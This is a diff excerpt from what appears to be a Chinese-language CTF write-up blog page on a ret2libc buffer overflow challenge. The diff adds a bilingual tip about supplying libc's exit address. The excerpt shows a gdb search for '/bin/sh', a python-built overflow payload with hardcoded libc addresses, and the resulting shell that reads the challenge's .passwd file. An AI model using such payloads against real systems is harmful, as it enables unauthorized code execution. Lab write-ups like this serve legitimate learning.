@@ -3880,7 +3880,7 @@ Searching for &#39;/bin/sh&#39; in range: 0xb7e27000 - 0xb7fd6000
 Found 1 results, display max 1 items:
 libc.so.6 : 0xb7f8ad4c (&quot;/bin/sh&quot;)</code></pre>
 <p>或者<br><code>gdb-peda$ find &quot;/bin/sh&quot;</code></p>
-<p>成功，中间exit()不用连接也可以</p>
+<p>成功，中间exit()不用连接也可以<br>for exiting without segmentation fault, it’s necessary to replace the ‘DDDD’ with a valid address (e.g address to libc’s exit function).<br>需要退出没有段报错，将DDDD用exit替换</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">app-systeme-ch33@challenge02:~$ ./ch33 $(python -c <span class="string">&quot;print &#x27;a&#x27;*32+&#x27;\x10\x83\xe6\xb7&#x27;+&#x27;AAAA&#x27;+&#x27;\x4c\xad\xf8\xb7&#x27;&quot;</span>)</span><br><span class="line">Your message: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaƒæ·AAAAL­ø·</span><br><span class="line">$ id</span><br><span class="line">uid=1233(app-systeme-ch33-cracked) gid=1133(app-systeme-ch33) groups=1133(app-systeme-ch33),100(users)</span><br><span class="line">$ cat .passwd</span><br></pre></td></tr></table></figure>
 
 
